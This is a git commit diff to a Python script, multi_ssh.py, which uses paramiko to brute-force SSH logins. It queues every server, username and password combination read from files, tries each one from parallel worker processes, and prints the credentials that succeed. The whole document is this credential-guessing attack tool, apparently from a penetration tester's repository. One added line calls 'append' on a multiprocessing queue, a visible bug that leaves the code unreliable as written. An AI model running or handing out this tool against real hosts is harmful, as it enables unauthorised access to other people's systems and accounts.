1a3fac7abddb2390d96748ec0f5dfb28781e0f91
averagesecurityguy <stephen@averagesecurityguy.info>
2016-02-05 12:10:54 -0500

    Add the server IP address to the cred queue.

--- multi_ssh.py
+++ multi_ssh.py
@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 import multiprocessing
 import paramiko
 import sys
@@ -5,7 +7,8 @@ import time
 import Queue
 
 
-def worker(ip, cred_queue):
+def worker(cred_queue, success_queue):
+    print('Starting new worker thread.')
     while True:
         try:
             creds = cred_queue.get(timeout=10)
@@ -15,12 +18,12 @@ def worker(ip, cred_queue):
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(ip, username=creds[0], password=creds[1])
-            print 'Success: {0} {1} {2}'.format(ip, creds[0], creds[1])
+            ssh.connect(creds[0], username=creds[1], password=creds[2])
+            success_queue.append((creds[0], creds[1], creds[2]))
         except paramiko.AuthenticationException:
-            print 'Fail: {0} {1} {2}'.format(ip, creds[0], creds[1])
+            print 'Fail: {0} {1} {2}'.format(creds[0], creds[1], creds[2])
         except Exception, e:
-            print 'Fail: {0} {1}'.format(ip, str(e))
+            print 'Fail: {0} {1}'.format(creds[0], str(e))
             cred_queue.put(creds)
             return
 
@@ -28,11 +31,14 @@ def worker(ip, cred_queue):
 
 def file_to_list(filename):
     data = []
-    for line in open(filename, 'r'):
-        line = line.strip()
-        if line == '':
-            continue
-        data.append(line)
+    
+    with open(filename, 'r') as f:
+        for line in f:
+            line = line.strip()
+            if line == '': continue
+            if line.startswith('#'): continue
+            data.append(line)
+
     return data
 
 if __name__ == '__main__':
@@ -40,25 +46,33 @@ if __name__ == '__main__':
         print 'Usage: multi_ssh.py server_file username_file password_file'
         sys.exit()
 
+    threads = 4
     servers = file_to_list(sys.argv[1])
     usernames = file_to_list(sys.argv[2])
     passwords = file_to_list(sys.argv[3])
 
     cred_queue = multiprocessing.Queue()
-    threads = len(servers)
+    success_queue = multiprocessing.Queue()
     procs = []
 
+    print('Starting worker {0} worker threads.'.format(threads))
     for i in range(threads):
         p = multiprocessing.Process(target=worker,
-                                    args=(servers[i], cred_queue))
+                                    args=(cred_queue, success_queue))
         procs.append(p)
         p.start()
 
-    for user in usernames:
-        for pwd in passwords:
-            cred_queue.put((user, pwd))
+    print('Loading credential queue.')
+    for server in servers:
+        for user in usernames:
+            for pwd in passwords:
+                cred_queue.put((server, user, pwd))
 
     # Wait for all worker processes to finish
     for p in procs:
         p.join()
 
+    # Print any successful credentials
+    while not success_queue.empty():
+        ip, user, pwd = success_queue.get()
+        print '{0}: {1}/{2}'.format(ip, user, pwd)
